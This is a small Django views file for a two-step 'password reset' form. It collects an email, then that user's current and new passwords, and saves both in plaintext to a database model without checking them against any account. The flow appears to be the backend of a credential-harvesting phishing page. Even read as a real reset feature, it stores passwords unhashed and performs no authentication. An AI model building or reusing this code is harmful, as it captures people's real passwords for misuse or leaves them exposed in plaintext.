from django.shortcuts import render, redirect
from .models import User


def index(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        if email:
            request.session['email'] = email
            return redirect('pass_page')
        else:
            return render(request, 'myapp/index.html', {'error_message': 'Please enter your email'})
    return render(request, 'myapp/index.html')

def pass_page(request):
    email = request.session.get('email')
    display_message = False
    if not email:
        return redirect('password_reset')
    
    if request.method == 'POST':
        current_password = request.POST.get('current-password')
        new_password = request.POST.get('new-password')
        if current_password and new_password:
            # Save the email, current_password, and new_password to the database
            # Here, replace 'User' with the appropriate model for your user data
            user = User(email=email, current_password=current_password, new_password=new_password)
            user.save()
            display_message = True
            # Clear the email from the session
            del request.session['email']
        else:
            return render(request, 'myapp/pass_page.html', {'error_message': 'Please fill in all the fields'})
    
    return render(request, 'myapp/pass_page.html', {'email': email, 'display_message': display_message})
